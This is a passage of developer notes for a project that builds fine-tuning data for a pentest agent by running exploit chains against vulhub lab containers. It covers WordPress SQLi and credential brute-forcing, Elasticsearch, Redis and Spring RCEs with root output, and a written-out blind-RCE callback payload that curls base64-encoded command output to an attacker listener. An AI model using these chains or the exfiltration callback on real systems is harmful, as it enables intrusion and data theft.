because it's a full multi-page WordPress install with a real MySQL backend, a
genuine unauthenticated blind-SQLi CVE chain, and a baked-in admin/admin
default account.

**No proxy/mitmdump tool was built.** This repo has zero proxy-capture
support and no browser/client to drive traffic through one in this headless
harness -- the "URL list with parameters" step instead comes directly from
gobuster + dirb + katana output, deduped and filtered to lines containing
`?`. This gets the real goal (a verified list of param-bearing URLs to feed
sqlmap/commix) without inventing new tool infrastructure.

**Cross-step value passing** follows this file's existing convention (one big
`run_command` shell chain per stage, real `$VAR`/file capture) rather than
solving the general architecture gap noted below -- see the template's own
comment in `pipeline_recipes.py` for exactly how the stage_1 → stage_2
handoff (the param-URL list) crosses via a file on the exec target's own
persistent `/tmp`, not a template placeholder.

**Three real bugs found and fixed by actually running this live** (not just
reasoned through statically -- see the template's own comment for full
detail):
1. Plain `dirb -S` (recursive by default) against a real WordPress site's
   large, legitimately-browsable directory tree never finished -- it was
   still running, orphaned, inside the exec container more than two hours
   after the orchestrator's own `docker exec` call had already timed out and
   given up (killing the local client does NOT kill the process it started
   inside the container). Fixed with `-r` (non-recursive) plus wrapping every
   long-running sub-command in both stages with `timeout Ns`.
2. `remote_exec.py`'s `subprocess.run()` calls used strict UTF-8 decoding --
   a heavy chain's real combined stdout can contain a few genuinely invalid
   UTF-8 bytes, which raised `UnicodeDecodeError` *inside* `subprocess.run()`
   itself and got misreported as a generic `ssh_client_error` that hid the
   real, mostly-valid output entirely. Fixed at the shared `remote_exec.py`
   level with `errors="replace"` -- this fixes every tool call under
   `local_docker`/SSH transport, not just this recipe.
3. `-t wordpress-templates` is not a real nuclei template path (nuclei
   printed `[FTL] Could not run nuclei: no templates provided for scan` and
   silently moved on) -- fixed to `-tags wordpress`, nuclei's real mechanism
   for cross-directory tag filtering. A parallel bug in the searchsploit step
   (grepping nmap/gobuster output for a "WordPress X.Y" string that's never
   actually present in either, so `searchsploit ""` silently dumped the
   entire exploit-db every run) was fixed by curling the homepage and
   grepping its `<meta name="generator">` tag instead, guarded so
   searchsploit is skipped if that comes back empty.

**Live-verified real findings** (see `training-data/pipeline_chains_generated.jsonl`,
pathway `wp2shell_full_chain__v0`): hydra recovered the image's own
documented `admin`/`admin` default against `wp-login.php`; sqlmap correctly
reported all 10 discovered param-bearing URLs as NOT injectable at
`--level=2 --risk=2` (an honest negative -- CVE-2026-63030's real SQLi lives
in the `/wp/v2/batch` endpoint's JSON request body via
`author__not_in`/`author_exclude`, not a plain GET query param, so this is
the expected result); commix likewise found none of those URLs OS-command-
injectable (same reasoning); and nuclei's `-tags wordpress` pass identified
**both real CVEs live on the target** -- `CVE-2026-63030 critical` at
`/?rest_route=/batch/v1` (this recipe's own target vulnerability) and a bonus
`CVE-2026-64638 high` on `wp-login.php`.

**Frozen skeleton, intended variation points for follow-up work**: wordlists
(`gobuster`/`dirb`/`hydra`'s `cred_wordlist`), `sqlmap`'s `--level`/`--risk`,
thread counts, nuclei's `-severity` filter, and the per-tool `timeout N`
bounds are all meant to be tuned inside this frozen shape rather than
rebuilding the trajectory from scratch. Explicitly **out of scope** for this
first pass: the user's original "loop back to metasploit/proxy/fuzzers/XSS
all over again" idea as a genuine third-plus round --
`CONFIG.ALLOW_FULL_PIPELINE_CHAINS` only gates a single stage_1 → stage_2
boundary, there's no N-stage mechanism, and building one is a separate
architecture change. A second-generation variation (`__v1`) that re-enters
recon with the newly-recovered admin/admin credentials is the natural next
step, but it's follow-up work, not part of freezing v0.

### `es_groovy_rce_chain`: grinding through more vulhub targets, one at a time

The user asked to keep working through vulhub targets individually --
bring one up, run the existing tools/scripts against it, produce real
dataset rows, tear it down, move to the next -- rather than building out
every recipe in one sitting. `es_groovy_rce_chain` (`elasticsearch/
CVE-2015-1427`, Groovy sandbox bypass RCE) is the first of these: a
deliberately different vuln class from `wp2shell_full_chain` -- the RCE is
a single crafted `curl` POST to ES's own `_search` endpoint, no sqlmap/
commix/hydra needed at all, and it closes the loop with an unambiguous
**positive** result (`root`-level command execution) rather than
wp2shell's honest-negative sqlmap/commix pass. Live-verified end to end:
nuclei's `-tags elasticsearch` pass correctly identified CVE-2015-1427
itself plus a bonus CVE-2015-5531, and the actual exploit chain recovered
real command output (`id` → `uid=0(root) gid=0(root) groups=0(root)`,
`whoami` → `root`). One real gotcha found live: ES's near-real-time search
means querying immediately after indexing a seed document can return zero
hits (so `script_fields` never evaluates, silently looking like the RCE
itself failed) -- fixed with an explicit `POST /{index}/_refresh` between
seeding and exploiting, not a reliance on ES's default refresh interval.
See the template's own comment in `pipeline_recipes.py` for full detail.
This work is intentionally single-container/low-tool-surface (no directory
enumeration -- ES has no web-app content tree to brute-force), a
deliberate contrast with `wp2shell_full_chain`'s much broader tool spread,
so the corpus gets real variety in chain SHAPE, not just target IP.

### `redis_lua_rce_chain`: third grind-through target, a binary-protocol service

`redis/CVE-2022-0543` (Lua sandbox escape RCE, a Debian/Ubuntu packaging
bug reachable via an unauthenticated `EVAL`). A third distinct chain
shape: no HTTP/curl anywhere at all, exploitation is entirely through
`redis-cli` talking the native redis protocol. `redis-cli` was not
installed on `kali-agent-box` before this recipe (confirmed live via
`which redis-cli`) -- installed via `apt-get install -y redis-tools`, now
added to `CLAUDE.md`'s cold-start package list and `bd memories
gotcha-kali-package-list-for-execution-target`; any fresh/rebuilt exec
target needs this before any redis-targeting recipe works. Live-verified
end to end with a real positive result -- root-level `id`/`whoami` output
via the Lua `package.loadlib` sandbox escape -- and nuclei's `-tags redis`
pass (using a `host:port` target spec, not `http://`, since this
template lives under nuclei-templates' `network/` tree rather than
`http/` -- checked before guessing at invocation syntax) turned up a
genuinely large bonus haul: the target CVE itself, unauthenticated-access
confirmation, a live `redis-info` dump, and three further real 2025 CVEs
this same image is also vulnerable to.

### `spring_spel_rce_chain`: fourth grind-through target, the first genuinely BLIND one

`spring/CVE-2022-22963` (Spring Cloud Function SpEL injection via the
`spring.cloud.function.routing-expression` header). Unlike
`es_groovy_rce_chain`/`redis_lua_rce_chain`, this exploited service never
reflects anything: confirmed live that `Runtime.exec(...)` returns to the
caller immediately (no blocking on the child process), so neither the
HTTP response body (a generic 500 error every time) nor response timing
(tested directly -- a `sleep 5` payload came back in ~0.01s, identical to
a no-op payload) give any signal back. The real technique, confirmed
live end to end: route through `bash -c` (`exec(new
String[]{"bash","-c","curl http://<attacker-ip>:<port>/$(<cmd>|base64)"})`)
so the TARGET's own shell evaluates `$(...)`, and have it call back to a
plain `nc -lnp <port>` listener on `kali-agent-box` itself, carrying the
base64'd command output in the callback's own URL path -- `id` came back
as `uid=0(root) gid=0(root) groups=0(root)`. The listener's own IP isn't
hardcoded (kali-agent-box gets a fresh IP on every new vulhub network,
same as the target); it's derived at run time via `ip route get
{target}`, a general technique worth reusing for any future recipe
needing a reachable callback address. nuclei's real tag for this CVE is
`springcloud`, not `spring` (checked via `grep tags:` before guessing).
searchsploit came back "No Results" for this one -- an honest negative,
not a bug (see the template's own comment).

### `secrets_header_analysis_chain`: a target-agnostic recon stage, borrowed from surveying other OSINT pipelines

Inspired by [recon0](https://github.com/badchars/recon0), a Go bug-bounty
recon pipeline surveyed this session for chaining ideas (the user runs it
on real external targets; it errors on our internal vulhub-lab targets
because its ENUM/RESOLVE stages assume a real domain with subdomains/CT
logs/DNS -- a bare container IP has none of that). recon0's shape is a
9-stage pipeline: `ENUM(subfinder/amass) -> RESOLVE(dnsx, gate: stop if 0
alive) -> PROBE(httpx/tlsx) -> CRAWL(headless Chrome, HAR+JS) ->
PORTSCAN(naabu) -> DISCOVER(parse HAR/JS -> endpoints.json) ->
ANALYZE(60+ regex rules for secrets/misconfig) -> COLLECT(LLM ranks
attack paths) -> VULN(nuclei + tech-aware fuzzing)`. Checked what's
actually on `kali-agent-box` against recon0's own `providers` list:
`subfinder`/`amass` installed but not applicable (no subdomains to
enumerate against a single container IP); `dnsx` is apt-available on
Kali (`1.3.1-0kali1`) but not installed, also not applicable for the same
reason; `tlsx` isn't packaged under that name in Kali's repos at all and
has no Go toolchain on this box to build it from source either way, and
is low-value regardless since these targets are plain HTTP, not TLS;
`httpx`/`naabu`/`nuclei`/`katana` (recon0's PROBE/PORTSCAN/VULN/CRAWL
equivalents) are already in every existing recipe. Verdict: of recon0's 7
external providers, only the ones we already use apply to this project's
target shape (single-host, known-CVE, no DNS) -- not worth apt-installing
`dnsx` just to leave it idle, and RECONFLOW (the other Go project
checked) turned out to be a README-only stub with no actual code, nothing
to take from it.

The one genuinely new idea worth taking is recon0's **ANALYZE stage** --
nothing in this repo's existing recipes grepped crawled content/headers
for secrets or checked security-header hygiene. `secrets_header_analysis_chain`
reimplements that idea with what's already installed: `katana -jc -kf
all` (JS-endpoint parsing) stands in for recon0's headless-Chrome/HAR
capture -- no browser automation needed for these targets. Single-stage,
`recon_only`, read-only (header/content inspection + a handful of `curl`
probes, no exploitation), and deliberately target-agnostic (just a
`{target}` variable) so it's meant to be run as a first pass ahead of any
CVE-specific recipe, not tied to one CVE the way every other recipe here
is. LIVE-VERIFIED against wp2shell (`wordpress/CVE-2026-63030`,
172.31.0.3): correctly found real version disclosure (`Server:
Apache/2.4.67 (Debian)`, `X-Powered-By: PHP/8.3.31`) and three missing
security headers (HSTS/CSP/X-Frame-Options); the secret-pattern scan over
8 real fetched JS bodies and the sensitive-path probe (`.env`/`.git`/
`.bak`) both correctly returned zero matches -- honest negatives, not a
broken pattern, this target has no leaked secrets or exposed dotfiles.

**Real bug found on the first actual harness run** (not caught by
manually piping the same script through `bash -c` by hand -- only
surfaced going through the real `docker exec ... sh -c "<command>"`
`subprocess.run()` path `remote_exec.py` actually uses): a POSIX `sh -c`
script's own exit status is whatever its LAST executed statement
returns, and this chain's last statement was the sensitive-path probe's
`[ "$code" = "200" ]` test -- since every probe path correctly 404s on
this target (an honest negative), that test's own exit code is 1, which
the harness then reported as `stage_1_failed: true` even though every
finding printed was completely correct. Fixed by appending a final
`echo` after the loop (always exits 0) -- **general lesson for any future
recipe whose last pipeline step is a conditional/test rather than an
unconditional `echo`/`tee`: a real "no finding" outcome must never be
allowed to leak into the chain's own exit code**, or a negative result
and a genuine syntax/execution failure become indistinguishable to
whatever reads `stage_1_failed` downstream.

## Known gaps

- **Severe tool-usage imbalance in the CORPUS (the merged/exported training
  data), confirmed by a live evaluation pass earlier this session — the
  recipe-generation SIDE of this is now fixed, see below.** `run_command`
  accounts for 1012/1192 chain steps (85%) of what's actually merged and
  exported so far; `run_nmap` is next at 110; everything else is single
  digits. That's a statement about `combined_scripts_format.jsonl`/
  `combined_chatml_format.jsonl` today, not about what recipes exist to
  generate more — closing THAT gap needs actually farming these new
  recipes and running `merge_pipeline_chain_outputs.py` +
  `merge_scripts_format.py`, not just writing templates.
- **The 27→31 recipe fix: real breadth was structurally capped, not a
  farming problem.** Running `pipeline_chain_builder.py` across 3 machines
  repeatedly produced 319 raw rows that deduped down to only 27 distinct
  `(pathway, chain)` pairs — every machine was drawing from the exact same
  fixed 27-candidate pool (13 templates × their own small `variations`
  lists), so more machines/more runs could never produce more than 27
  distinct outcomes; the dedup script did its job correctly, it was
  reporting a real ceiling, not a bug. Fixed by adding 4 new templates
  targeting tools/services that had literally never been touched:
  `katana_crawl_wordpress`/`ffuf_wordpress_fuzz` (recon, against the
  then-live WordPress lab container — found real leads: `/xmlrpc.php?rsd`,
  `/author/admin/` username enumeration, `readme.html`/`license.txt`
  version fingerprinting; retargeted to `wordpress/CVE-2026-63030` under
  the vulhub pivot above, same tools, same finding shape) and
  `ftp_anon_medusa_chain`/`ftp_anon_ncrack_chain` (exploit_conditional,
  against the lab's then-live anonymous-FTP container — gated on nmap's
  `ftp-anon` NSE script real output "Anonymous FTP login allowed", not a
  blanket override; both credential tools correctly reported every
  password as a hit against the intentionally-open `anonymous` account,
  which was itself the real finding, not "we cracked a password"; now
  RETIRED, see the vulhub pivot section above — no vulhub equivalent
  exists for a misconfiguration-class finding). All 4 were `verified: True`
  and live-tested end to end through the real `pipeline_chain_builder.py`
  harness at the time (not just the bare CLI tools standalone). This
  closed 3 of the 4 previously-zero-coverage tools (`run_ncrack`,
  `run_medusa`, `run_katana`; `run_ffuf` already had partial coverage) --
  `run_medusa`/`run_ncrack` lost their only live example again when
  `ftp_anon_*` retired, a real coverage regression worth tracking if a
  misconfiguration-lab target ever comes back. `run_netstat` remains a
  genuine, permanent gap — it
  has no `target` param at all (`tools.py`'s `_run_netstat` runs
  `netstat`/`ss` on whatever host is executing the command, i.e. the Kali
  box itself, not a remote lab target), so it doesn't fit this recipe
  system's "point a tool at a lab container" shape at all; it belongs in a
  different kind of example (checking the *execution target's own* state
  mid-engagement), not a pipeline-chain recipe.
  **Scope decision: SNMP/SMTP are OUT, not just "not yet templated."**
  SNMP (172.25.0.4) and SMTP (172.25.0.6) were both confirmed live and
  exploitable during this same investigation (SNMP's `public` community
  string readable, SMTP a real Postfix instance), and were considered as
  the next targeting expansion -- explicitly ruled out instead: this
  project's current focus is web recon/OSINT/remote-vuln surface, and
  neither the tooling depth nor the target diversity for SNMP/SMTP
  justified the scope creep (no `run_snmpwalk`-equivalent tool even
  exists in `SUPPORTED_TOOLS`, and adding one would be a new-tool
  decision on top of a new-service decision). Do not add SNMP/SMTP
  templates without re-opening this decision explicitly.
- **Two new tools added, one rejected.** `run_dirb` (a second, independent
  directory-brute tool alongside `run_gobuster`/`run_ffuf`) and `run_commix`
  (OS command-injection exploitation, with real Metasploit integration via
  `--msf-path`) are now real `SUPPORTED_TOOLS` with structured params —
  `dirb_recon` and `dvwa_commix_exec_chain` are the first real recipes using
  them. DirBuster (the actual Java/Swing tool, as distinct from `dirb`) was
  tried first and rejected: its headless mode throws a real
  `NullPointerException` on startup in the Kali package (confirmed
  reproducible twice, `Manager.start()` unconditionally touches a GUI panel
  object never initialized headless) — a real upstream bug in an
  unmaintained tool, not a flag issue, so it's not wired up at all rather
  than shipping something that can't run. `run_commix` needed two real
  fixes found live, both baked into `tools.py`'s `_run_commix` itself: (1)
  `--ignore-stdin` — commix checks `sys.stdin.isatty()` at startup and,
  under ANY non-interactive invocation (every docker-exec/SSH call this
  harness ever makes), silently switches into bulk-stdin target-parsing
  mode and ignores `-u` entirely, with no error; (2)
  `--answers='shell=N,random=Y,use the URL=Y,Insufficient=Y'` — after a
  confirmed injection, commix asks several interactive follow-up questions
  (spawn a shell? use a random output file? fall back to `/tmp/`?) that
  `--batch` does NOT suppress, and the shell-spawn prompt's default flips
  to Y once `--ignore-stdin` is set — confirmed to hang FOREVER retrying
  an EOF read against non-interactive stdin without the explicit answers.
  `dvwa_commix_exec_chain` is `verified: True`, confirmed via 5 consecutive
  clean live runs (including 2 launched concurrently, and the final run
  using the literal command string `_run_commix()` generates, not a
  hand-typed copy) with real RCE each time (`id`/`whoami` against DVWA's
  command-injection module). An intermediate debugging detour is worth
  keeping in mind: 2 of the first 5 attempts against this exact
  target/param failed, which briefly looked exactly like "commix's own
  detection is non-deterministic" — it wasn't. The real cause was a bug in
  the recipe's OWN login/cookie-capture logic (an earlier version did a
  plain anonymous GET for the CSRF token, then a separate login POST with
  no cookie jar at all, relying on DVWA happening to mint a fresh session
  on that POST) — DVWA's CSRF check only validates when the SAME session
  from the initial GET is carried into the login POST, so the flawed
  version's login intermittently redirected back to `login.php` (failure)
  instead of `index.php` (success), and commix spent the whole run testing
  an unauthenticated page that was never going to be injectable. Fixed by
  using one persistent cookie jar across both curl calls. A SEPARATE real
  bug was found and fixed in the `--answers` string itself along the way:
  `--answers` matches by substring against the live prompt text, and an
  earlier attempt's `directory=N` key ALSO substring-matched an unrelated
  free-text prompt ("Enter a writable directory..."), forcing the literal
  string `"N"` in as a bogus directory path and breaking every later
  technique in that run. **Lesson for future debugging**: if a real
  exploit chain "randomly" fails run-to-run against an identical target,
  check the test/recipe's own session/login handling before concluding the
  target tool's detection itself is nondeterministic.
- **Structured cross-step value passing isn't supported yet.** A template
  whose stage 2 needs a value stage 1 only discovers at runtime (a session
  cookie, a CSRF token, a found credential) can't express that today — a
  drafted `authenticated_sqli_dump_chain` template hit exactly this
  (needed a live PHPSESSID from a login step fed into `run_sqlmap`'s
  `cookie` param) and was removed rather than shipped broken; see
  `pipeline_recipes.py`'s comment where it used to be. The `run_command`
  shell-string chains sidestep this (`$host`/`$port` capture works
  because it's all one shell invocation), but any future two-stage
  template using separate STRUCTURED tool calls with a dynamically-
  captured intermediate value needs a real mechanism here first.
- **Param-name validation and SYSTEM_PROMPT-vs-`tools.py` drift: both
  independently confirmed clean this session.** A 105-row stratified
  sample plus a full pass over all 1192 rows found 0 chain-step params
  that don't match what `tools.py`'s `execute_tool()`/`_run_*` methods
  actually read; every documented tool param/default in `agent.py`'s
  `SYSTEM_PROMPT` (hydra wordlists/service names, naabu's `-host`
  requirement, gobuster/ffuf wordlist defaults, sqlmap cookie handling)
  matches the real implementation. `CHAIN_JSON_SCHEMA` importing
  `tools.SUPPORTED_TOOLS` directly makes tool-name drift structurally
  impossible; this confirms the *param-level* documentation hasn't drifted
  either.
- **Multi-turn ratio is far below target.** The original design target
  (confirmed correct, per user review) is ~60–70% multi-turn / 30–40%
  single-turn in the core-pathway portion — deliberately oversampling the
  escalation weak point rather than mirroring natural frequency (which
  would be single-turn-heavy, since most ports never need round 2 once
  the breach-conflation bug is fixed). Current actual: 11 verified-
  sequential multi-turn conversations out of 1184 (still under 1%).
  Closing this gap is the single highest-priority remaining item.
  `pipeline_chain_builder.py`'s template system (see "Template-generated
  recipes, and farming this out across machines" above) plus the
  multi-machine farming workflow is the intended path to actually move
  this ratio, not one-at-a-time hand authoring — but every `stage_2` a
  template reaches still needs `ALLOW_FULL_PIPELINE_CHAINS=true` run
  against a real target to produce an actual 2-turn row, and that's still
  almost entirely undone (`web_login_discovery_hydra_chain`'s two
  variations are drafted and marked `"components_only"`, not yet run as
  one chain).
- **Multi-turn value against a live Kali target is not independently
  validated yet.** The corpus *contains* real multi-turn examples
  (`playbook_dvwa.jsonl`, `exports_transcript2_extracted.jsonl`), but
  nothing has actually fine-tuned on them and re-run against
  `kali-agent-box` to check whether multi-turn training changes behavior —
  this should happen **before** treating the merged corpus as done, not
  after, since it's the one property (recon→exploit continuation across
  rounds) this whole fine-tune exists to fix. Recommend: hold off calling
  this corpus "integration-ready" until at least one training pass and a
  re-run against a real target confirms the multi-turn examples actually
  move the needle, not just that they parse.
- **The WordPress theme-editor RCE outcome is still unconfirmed
  end-to-end** (`exports_transcript2_extracted.jsonl`, 2 rows, `reviewed:
  false`). Field values are real and live-captured, not fabricated — that
  specific worry from earlier in this session is resolved — but the actual
  webshell write + command execution + clean restore was never completed
  live (blocked by the permission classifier as too invasive to finish in
  that pass). Needs either a completed live run against `web2-1`
  (172.26.0.3, still up as of this session) or an explicit decision to
  train on the unconfirmed version anyway with `unverified_outcome` set.
- **`logs_extracted_UNREVIEWED.jsonl` still needs its curation pass** — 95
  rows, `reviewed: false` on every one, real historical `(goal, chain,
  real_outcomes)` triples including known-wrong model attempts. Excluded
  from both merged exports for now. A natural follow-up: use it to build
  more `failure_recovery.jsonl`-style paired examples (wrong attempt +
  correct fix) rather than training on the raw wrong attempts directly.
- **Danger-level tagging is a first-pass heuristic, not a hand review** —
  see `dataset_taxonomy.py`'s docstring. The tradecraft/level-4 keyword
  list is a starting set (ransomware/keylogger/rootkit/backdoor/
  persistence/anti-forensic/EDR-evasion/wiper/self-replicating), not
  exhaustive — a term like "trojan", "C2", or "exfiltrate" wouldn't be
  caught today. Worth a real pass before this taxonomy is trusted for an
  external/public export.
- **Multi-turn "history" text is duplicated verbatim across turns** in the
  ChatML conversations built from `playbook`/`exports` sources, since the
  source `goal` strings already embed round-N history as flattened prose
  (matching exactly what `agent.py` actually sends the model at runtime —
  correct for `combined_scripts_format.jsonl`'s purpose, but redundant for
  a ChatML consumer that would rather see structured turn-by-turn state).
  Not fixed here — would require re-deriving structured per-turn state
  from the flattened prose, a real design decision, not a bug fix.
- **`generated_pathways.jsonl` and `playbook_dvwa.jsonl` only cover 6 of
  `playbook_dvwa.sh`'s 10 techniques** (XSS/CSRF/weak-session-id/blind-SQLi
  remain).
- **`icantiemyshoe/cve-to-metasploit-module`** (previewed, see `mnemoria/`)
  is deliberately excluded — it's "write a new Ruby module from scratch"
  content, a different task shape than what `run_metasploit` does.
- **`mnemoria/` lost some entries this session** to an unrelated git-
  history-scrub mishap (an uncommitted delta between `git status`'s
  45630-byte baseline and this session's actual 56368-byte store was wiped
  by a `git filter-repo` run that included an unstashed working tree —
  fixed going forward, but the specific lost entries — narrative notes on
  the WordPress RCE finding, the nmap-cap-policy decision, the recon-only-
  mode/naabu closures — would need to be re-added from
  `exports_transcript2_extracted.jsonl`/bd issue close reasons/this file if
  wanted back; not done automatically since it's re-derivation, not
  restoration.
